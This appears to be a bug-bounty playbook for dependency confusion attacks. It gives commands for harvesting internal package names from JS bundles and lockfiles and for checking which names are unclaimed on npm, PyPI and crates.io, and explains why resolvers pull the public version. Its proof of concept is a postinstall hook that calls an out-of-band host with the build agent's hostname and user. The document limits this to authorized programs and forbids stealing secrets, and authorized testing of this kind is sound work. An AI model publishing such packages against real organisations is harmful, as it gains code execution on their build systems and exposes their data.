# Dependency Confusion — Unclaimed Internal Packages → Supply-Chain RCE

> An internal package name referenced in public build artifacts is **unclaimed** on the public registry. Publish it there → the target's build/CI pulls YOURS → code execution on their build agent. Ceiling: supply-chain RCE across the org.

**Ownership discipline:** only claim/publish names **you legitimately own the takeover of** within an authorized program. PoC = a benign package that phones home (DNS/HTTP beacon) from `postinstall`. **Never ship destructive or data-stealing code**, even to prove it.

---

## 1. Harvest internal package names

```bash
# From client JS bundles / webpack / sourcemaps / HAR
grep -rEoh '"@[a-z0-9][a-z0-9._-]*/[a-z0-9._-]+"' js/ | tr -d '"' | sort -u > pkgs.scoped
grep -rEoh '"[a-z][a-z0-9._-]+"\s*:\s*"[\^~]?[0-9]' js/ | cut -d'"' -f2 | sort -u > pkgs.flat

# From leaked manifests (best signal — exact deps)
#   package.json, package-lock.json, yarn.lock, pnpm-lock.yaml, .npmrc
#   requirements.txt, Pipfile.lock, poetry.lock, setup.py
#   Cargo.toml, Cargo.lock ; go.mod ; pom.xml, build.gradle ; composer.json ; Gemfile.lock
# From GitHub/GitLab, Docker layers, CI logs, exposed registries (verdaccio, Nexus, Artifactory)
```

**Look for the tell-tales:**
- Scoped npm `@acme-internal/*`, `@acme/*` where the scope is unclaimed.
- `.npmrc` / `.yarnrc` with a private `registry=` or scope map — proves internal registry usage.
- Package names that are *not* on the public registry but appear in a lockfile with a private `resolved` URL.
- Company-flavored names (`acme-auth`, `acme-logger`, `internal-utils`).

---

## 2. Check claimability (the takeable ones)

```bash
# npm — 404 = unclaimed = takeable
for p in $(cat pkgs.scoped pkgs.flat); do
  npm view "$p" version >/dev/null 2>&1 || echo "UNCLAIMED(npm): $p"
done

# PyPI
for p in $(cat pkgs.py); do
  curl -s -o /dev/null -w '%{http_code}' "https://pypi.org/pypi/$p/json" | grep -q 404 && echo "UNCLAIMED(pypi): $p"
done

# crates.io
curl -s "https://crates.io/api/v1/crates/$p" | grep -q '"errors"' && echo "UNCLAIMED(crate): $p"

# RubyGems: https://rubygems.org/api/v1/gems/$p.json (404=free)
# Go: a module path whose VCS host/org is claimable → typosquat/namespace
# Maven: groupId you can own on Maven Central / a public repo the build also queries
```

**Scope-ownership caveat (npm):** an unclaimed *scope* (`@acme/`) is takeable; an unclaimed name inside a *claimed* scope is not. Verify the scope org isn't reserved.

---

## 3. Root causes that make it fire
- Build config queries **public registry as a fallback** when private is unreachable/missing (`npm install` default, misconfigured `.npmrc`, no scoped registry pin).
- **Higher public version wins** — publish `99.0.0`; resolvers prefer newest.
- CI runs `install` with public access before/without the private registry configured.
- Python `--extra-index-url` (not `--index-url`) merges public + private → public shadows.

---

## 4. PoC (benign beacon only, in scope)

```js
// package.json  (npm) — postinstall beacon proving execution on their build agent
{
  "name": "@acme-internal/config",
  "version": "99.99.99",
  "scripts": { "postinstall": "node -e \"require('https').get('https://OOB.collab/'+require('os').hostname()+'/'+process.env.USER)\"" }
}
```
```bash
npm publish --access public          # only a name you're authorized to claim in the program
```
Confirmation = an OOB hit from the target's build infra (internal hostname/user in the callback). That callback **is** the P1 proof. Do not exfiltrate env/secrets even though `postinstall` could.

**Also route from:** exposed internal registry mirror listing internal names (→ exposed-services.md), or a GitHub write-PAT that lets you push to their private registry (→ secrets-recon.md).

---

## Report lead
`[Supply-chain] Dependency confusion: @acme-internal/config unclaimed on npm; target build pulled attacker package (OOB callback from build-agent <internal-host>). → RCE on CI, org-wide.`

Tooling: `confused`, `snync`, `depfuzzer`, `apkleaks` (mobile), plus manual lockfile review.
